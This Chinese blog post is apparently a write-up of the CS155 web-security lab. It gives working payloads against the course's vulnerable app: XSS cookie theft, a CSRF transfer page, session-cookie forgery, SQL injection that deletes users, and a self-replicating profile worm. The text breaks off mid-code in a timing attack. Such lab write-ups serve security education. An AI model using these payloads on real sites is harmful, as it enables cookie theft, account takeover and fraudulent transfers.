                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-06 22:58:47" itemprop="dateCreated datePublished" datetime="2023-04-06T22:58:47+08:00">2023-04-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-12 09:31:50" itemprop="dateModified" datetime="2023-05-12T09:31:50+08:00">2023-05-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="下载说明等文档">下载说明等文档</h2>
<p>来自 <a target="_blank" rel="noopener" href="https://cs155.github.io/Spring2022/">cs155
Spring2022</a>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://cs155.github.io/Spring2022/hw_and_proj/proj2/proj2.pdf</span><br><span class="line">curl -O https://cs155.github.io/Spring2022/hw_and_proj/proj2/proj2.zip</span><br></pre></td></tr></table></figure>
<h2 id="实验环境搭建">实验环境搭建</h2>
<p>实验在 VMware 上进行，使用的 Linux 发行版为 Ubuntu 22.04 Server。</p>
<p>docker 的安装参考<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/ubuntu/">官方文档</a></p>
<p>依次执行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unzip proj2.zip -d proj2/</span><br><span class="line"><span class="built_in">cd</span> proj2</span><br><span class="line">bash build_image.sh</span><br><span class="line">bash start_server.sh</span><br></pre></td></tr></table></figure>
<p>通过 <code>ifconfig</code> 或 <code>ip addr show</code> 找到虚拟机的
ip，然后就可以在主机的浏览器上访问了。</p>
<h3 id="npm-install-失败">npm install 失败</h3>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> =&gt; ERROR [4/5] RUN npm install                                                                                             561.5s</span><br><span class="line">------</span><br><span class="line"> &gt; [4/5] RUN npm install:</span><br><span class="line">#0 321.1 npm ERR! network timeout at: https://registry.npmjs.org/babel-cli</span><br><span class="line">#0 561.5</span><br><span class="line">#0 561.5 npm ERR! A complete log of this run can be found in:</span><br><span class="line">#0 561.5 npm ERR!     /root/.npm/_logs/2023-04-06T13_43_13_637Z-debug.log</span><br><span class="line">------</span><br><span class="line">Dockerfile:12</span><br><span class="line">--------------------</span><br><span class="line">  10 |     # where available (npm@5+)</span><br><span class="line">  11 |</span><br><span class="line">  12 | &gt;&gt;&gt; RUN npm install</span><br><span class="line">  13 |</span><br><span class="line">  14 |     # Bundle app source</span><br><span class="line">--------------------</span><br><span class="line">ERROR: failed to solve: process &quot;/bin/sh -c npm install&quot; did not complete successfully: exit code: 1</span><br></pre></td></tr></table></figure>
<p>发现手动 <code>curl https://registry.npmjs.org/babel-cli</code>
是可以连上的。推测是 docker 的问题。于是在 Dockerfile
中加入下面一行进行测试:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN curl https://registry.npmjs.org/babel-cli</span><br></pre></td></tr></table></figure>
<p>得到报错:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl: (6) Could not resolve host: registry.npmmirror.com</span><br></pre></td></tr></table></figure>
<p>推测为 DNS 问题。找到一篇 <a target="_blank" rel="noopener" href="https://blog.csdn.net/lennSUIkA/article/details/80157427">CSDN
博客</a>。</p>
<p>参考<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-configuration-file">官方文档</a>，修改
/etc/docker/daemon.json 添加 dns 服务器。</p>
<p>该地址通过 <code>resolvectl status | grep DNS</code> 查看。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dns&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;192.168.43.2&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>修改后，重启 docker 服务即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<h3 id="挂起虚拟机后重新打开无法访问容器">挂起虚拟机后重新打开无法访问容器</h3>
<p>不懂，遇事不决 <code>systemctl restart docker</code>。</p>
<h2 id="攻击实验">攻击实验</h2>
<h3 id="cookie-theft">Cookie Theft</h3>
<p>看源码，views/profile/view.ejs 里，直接把 errorMsg 塞进了 Html
文本里，而 router.js 里这个错误信息是这样定义的:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;req.query.username&#125;</span> does not exist!`</span></span><br></pre></td></tr></table></figure>
<p>也就是说，我们要构造字符串替换掉下面的 username 部分</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&#x27;error&#x27;</span>&gt;</span> $&#123;req.query.username&#125; does not exist! <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>前面的标签让它闭合，后面的标签让它隐藏，中间塞脚本就行。答案如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;/p&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">let</span> cke = <span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">let</span> url = <span class="string">`steal_cookie?cookie=<span class="subst">$&#123;cke&#125;</span>`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, url);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">send</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="cross-site-request-forgery">Cross-Site Request Forgery</h3>
<p>edge 和 chrome 的同源策略都太严格了，所以这个实验我用的 IE。</p>
<p>F12 抓包，模仿他的表头发 Post 就行。</p>
<p>恶意网页如下:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bad Website!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://192.168.43.134:3000/post_transfer&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>(<span class="string">&quot;destination_username=user1&amp;quantity=10&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>登录网页后打开这个恶意页面会往 user1 发 10 块钱然后导到百度。</p>
<h3 id="session-hijacking-with-cookies">Session Hijacking with
Cookies</h3>
<p>看源码 app.js，用的 <a target="_blank" rel="noopener" href="https://github.com/expressjs/cookie-session/blob/master/index.js">cookie-session</a>，而且压根没加密。把
cookie 里的 session 弄出来直接通过 base64 解码就是 json
了，然后直接改就完事了。改完给它塞回去。</p>
<p>取 cookie 的前面大段 docCookie 我是从 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie">MDN</a>
上直接抄的。其实直接用 substr 截取字符串也是一样的。</p>
<p>如果 profile
里有奇奇怪怪的特殊字符可能会在解码的时候出岔子？算了，题目没在乎这个。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docCookies = &#123;</span><br><span class="line">    <span class="attr">getItem</span>: <span class="keyword">function</span> (<span class="params">sKey</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;(?:(?:^|.*;)\\s*&quot;</span> + <span class="built_in">encodeURIComponent</span>(sKey).<span class="title function_">replace</span>(<span class="regexp">/[-.+*]/g</span>, <span class="string">&quot;\\$&amp;&quot;</span>) + <span class="string">&quot;\\s*\\=\\s*([^;]*).*$)|^.*$&quot;</span>), <span class="string">&quot;$1&quot;</span>)) || <span class="literal">null</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">setItem</span>: <span class="keyword">function</span> (<span class="params">sKey, sValue, vEnd, sPath, sDomain, bSecure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!sKey || <span class="regexp">/^(?:expires|max\-age|path|domain|secure)$/i</span>.<span class="title function_">test</span>(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="keyword">var</span> sExpires = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (vEnd) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (vEnd.<span class="property">constructor</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="title class_">Number</span>:</span><br><span class="line">                    sExpires = vEnd === <span class="title class_">Infinity</span> ? <span class="string">&quot;; expires=Fri, 31 Dec 9999 23:59:59 GMT&quot;</span> : <span class="string">&quot;; max-age=&quot;</span> + vEnd;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="title class_">String</span>:</span><br><span class="line">                    sExpires = <span class="string">&quot;; expires=&quot;</span> + vEnd;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="title class_">Date</span>:</span><br><span class="line">                    sExpires = <span class="string">&quot;; expires=&quot;</span> + vEnd.<span class="title function_">toUTCString</span>();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">&quot;=&quot;</span> + <span class="built_in">encodeURIComponent</span>(sValue) + sExpires + (sDomain ? <span class="string">&quot;; domain=&quot;</span> + sDomain : <span class="string">&quot;&quot;</span>) + (sPath ? <span class="string">&quot;; path=&quot;</span> + sPath : <span class="string">&quot;&quot;</span>) + (bSecure ? <span class="string">&quot;; secure&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">removeItem</span>: <span class="keyword">function</span> (<span class="params">sKey, sPath, sDomain</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!sKey || !<span class="variable language_">this</span>.<span class="title function_">hasItem</span>(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">&quot;=; expires=Thu, 01 Jan 1970 00:00:00 GMT&quot;</span> + (sDomain ? <span class="string">&quot;; domain=&quot;</span> + sDomain : <span class="string">&quot;&quot;</span>) + (sPath ? <span class="string">&quot;; path=&quot;</span> + sPath : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hasItem</span>: <span class="keyword">function</span> (<span class="params">sKey</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;(?:^|;\\s*)&quot;</span> + <span class="built_in">encodeURIComponent</span>(sKey).<span class="title function_">replace</span>(<span class="regexp">/[-.+*]/g</span>, <span class="string">&quot;\\$&amp;&quot;</span>) + <span class="string">&quot;\\s*\\=&quot;</span>)).<span class="title function_">test</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">keys</span>: <span class="comment">/* optional method: you can safely remove it! */</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> aKeys = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">replace</span>(<span class="regexp">/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">split</span>(<span class="regexp">/\s*(?:\=[^;]*)?;\s*/</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> nIdx = <span class="number">0</span>; nIdx &lt; aKeys.<span class="property">length</span>; nIdx++) &#123; aKeys[nIdx] = <span class="built_in">decodeURIComponent</span>(aKeys[nIdx]); &#125;</span><br><span class="line">        <span class="keyword">return</span> aKeys;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ses = docCookies.<span class="title function_">getItem</span>(<span class="string">&quot;session&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> info_s = <span class="title function_">b64_to_utf8</span>(ses);</span><br><span class="line"><span class="keyword">let</span> info = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(info_s);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info_s);</span><br><span class="line"></span><br><span class="line">info.<span class="property">account</span>.<span class="property">username</span> = <span class="string">&quot;user1&quot;</span>;</span><br><span class="line">info_s = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(info);</span><br><span class="line">ses = <span class="title function_">utf8_to_b64</span>(info_s);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info_s);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;session=&quot;</span> + ses;</span><br></pre></td></tr></table></figure>
<h3 id="cooking-the-books-with-cookies">Cooking the Books with
Cookies</h3>
<p>看源码 router.js，会发现它在更新数据的时候原数目是直接从 session
里取的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">bitbars</span> -= amount;</span><br><span class="line">query = <span class="string">`UPDATE Users SET bitbars = &quot;<span class="subst">$&#123;req.session.account.bitbars&#125;</span>&quot; WHERE username == &quot;<span class="subst">$&#123;req.session.account.username&#125;</span>&quot;;`</span>;</span><br><span class="line"><span class="keyword">await</span> db.<span class="title function_">exec</span>(query);</span><br></pre></td></tr></table></figure>
<p>所以你直接对 cookie 改动，然后随便 trans
一下，这个东西就写到数据库里了。</p>
<p>答案如下，基本跟上一个是一样的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docCookies = &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> ses = docCookies.<span class="title function_">getItem</span>(<span class="string">&quot;session&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> info_s = <span class="title function_">atob</span>(ses);</span><br><span class="line"><span class="keyword">let</span> info = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(info_s);</span><br><span class="line">info.<span class="property">account</span>.<span class="property">bitbars</span> = <span class="number">1000000000</span>;</span><br><span class="line">info_s = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(info);</span><br><span class="line">ses = <span class="title function_">btoa</span>(info_s);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;session=&quot;</span> + ses;</span><br></pre></td></tr></table></figure>
<h3 id="sql-injection">SQL Injection</h3>
<p>看源码 router.js，代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> query = <span class="string">`DELETE FROM Users WHERE username == &quot;<span class="subst">$&#123;req.session.account.username&#125;</span>&quot;;`</span></span><br><span class="line"><span class="keyword">await</span> db.<span class="title function_">get</span>(query);</span><br></pre></td></tr></table></figure>
<p>要求删掉该用户时 user3
也会被删掉。关键在于如何让这个恶意用户也一起被删掉。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user3&quot; or username like &quot;user3%</span><br></pre></td></tr></table></figure>
<h3 id="profile-worm">Profile Worm</h3>
<p>查看 Profile 时触发，观察源码，profile 的内容是插入到 html
里的，鉴定为 XSS 注入。</p>
<p>目标是传染，查询到被感染的 profile 会让自己的 profile 也变成这个，且
bitbars 显示为 10，并给攻击者发 1 块钱。</p>
<p>这个显示为 10，则是利用 id 的唯一性，在前面把
<code>bitbar_count</code> 这个 id 先占住。</p>
<p>接下来就是自我复制的问题了。直接把内容写进字符串里套娃是不可能的，那就只能复制显示出来的东西了。</p>
<p>看源码 views/pages/profile/view.ejs，发现这部分是有 id 的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (result.username &amp;&amp; result.profile) &#123; %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;profile&quot;</span>&gt;</span>&lt;%- result.profile %&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure>
<p>利用这个 id 来复制内容就好了。</p>
<p>但是，直接从元素的 innerHTML 里搞出来的是没处理过的，里面会有一些像
<code>&amp;</code> 或是奇怪的字符。需要处理一下。随便 update profile
一下观察一下，不难看出在提交表单时是转义过的（废话</p>
<p>参考万能的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/encodeURI">MDN</a>，发起
post 请求的时候用 <code>encodeURIComponent()</code> 编码就行了。</p>
<p>cookie 里的 profile 改不改无所谓（虽然我还是改了），反正 logout
重进就出来了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>You are infected!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;bitbar_count&quot;</span> <span class="attr">class</span>=<span class="string">&quot;10&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// parse cookie</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> ses = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">slice</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> info_s = <span class="title function_">atob</span>(ses);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> info = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(info_s);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// get profile and modify</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> prof = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;profile&quot;</span>).<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">    info.<span class="property">account</span>.<span class="property">profile</span> = prof;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// encode again</span></span></span><br><span class="line"><span class="language-javascript">    info_s = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(info);</span></span><br><span class="line"><span class="language-javascript">    ses = <span class="title function_">btoa</span>(info_s);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;session=&quot;</span> + ses;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// trans</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> xhr1 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr1.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;post_transfer&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr1.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr1.<span class="title function_">send</span>(<span class="string">&quot;destination_username=attacker&amp;quantity=1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// upload profile to database</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> xhr2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr2.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;set_profile&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr2.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr2.<span class="title function_">send</span>(<span class="string">&quot;new_profile=&quot;</span> + <span class="built_in">encodeURIComponent</span>(prof));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="password-extraction-via-timing-attack">Password Extraction via
Timing Attack</h3>
<p>最后这个是要你改 gamma_starter.html 来进行一次侧信道攻击。</p>
<p>这个 on error
我没用过，随便试了试，大概就下面这样吧。总之，记下用时，取那个最离谱的就行。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#x27;display:none&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&#x27;test&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> dictionary = [<span class="string">`password`</span>, <span class="string">`123456`</span>, <span class="string">`12345678`</span>, <span class="string">`dragon`</span>, <span class="string">`1234`</span>, <span class="string">`qwerty`</span>, <span class="string">`12345`</span>];</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index = <span class="number">0</span>, ans = -<span class="number">1</span>, ti = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> test = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">`test`</span>);</span></span><br><span class="line"><span class="language-javascript">    test.<span 